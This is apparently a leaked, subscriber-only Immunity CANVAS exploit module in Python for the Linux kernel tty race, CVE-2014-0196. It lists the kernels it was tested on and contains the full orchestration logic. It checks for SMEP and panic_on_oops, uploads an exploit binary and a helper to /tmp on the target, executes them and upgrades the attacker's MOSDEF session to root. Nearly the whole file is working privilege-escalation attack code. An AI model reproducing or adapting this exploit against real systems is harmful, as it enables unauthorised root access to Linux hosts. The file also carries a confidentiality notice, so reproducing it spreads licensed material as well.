#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import os
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit
from linuxNode import linuxNode

NAME                           = 'linux_tty_race local root'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2014-0196'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2014-0196'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0196'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux', 'x64']]

DOCUMENTATION['Notes'] = """

Exploit has been tested successfully on:
- Ubuntu 13.10 3.14.1-vanilla
- Ubuntu 14.04 3.14.1-vanilla
- Ubuntu 14.04 3.14.2-vanilla
- Fedora 20    3.14.2-200.fc20.x86_64

Currrently supports:
>= 3.14-rc1 vanilla
<= 3.15-rc4 vanilla

"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, 'x')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node

            if self.node.shell is None:
                self.log("[EE] Node has no shell server available")
                self.log("[EE] Bailing")
                continue

            if not self.is_linux_node():
                continue
            if not self.is_64bit_node():
                continue

            if self.check_smep():
                self.log('[ii] Found SMEP on target host')
                self.log('[EE] Aborting')
                continue

            #
            # if panic_on_oops is enforced this exploit will likely panic
            # the remote kernel, let's avoid that
            #
            if self.panic_on_oops():
                self.log("[ii] Target node has enforced panic_on_oops setting")
                self.log("[EE] Aborting")
                continue

            if self.compromised(self.remote_helper, 0):
                self.log('[+] Already compromised')
                self.log('[+] Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.log('[+] Done')

                self.init_mosdef_upgrade()
                self.cleanup()
                continue

            self.log_info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                continue
            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                continue

            self.log('[+] Executing exploit')
            self.fork_and_exec(self.remote_exp)
            self.log('[+] Waiting...')

            # wait 40 secs for the exploit to complete
            wait_secs = 40
            if self.compromised(self.remote_helper, wait_secs):
                self.log('[+] Compromised!')
                self.log('[+] Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.cleanup()
                self.log('[+] Done')

                self.init_mosdef_upgrade()
                self.cleanup()
            else:
                self.log('[EE] Looks like we failed, try again!')
                self.cleanup()

        return 0


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
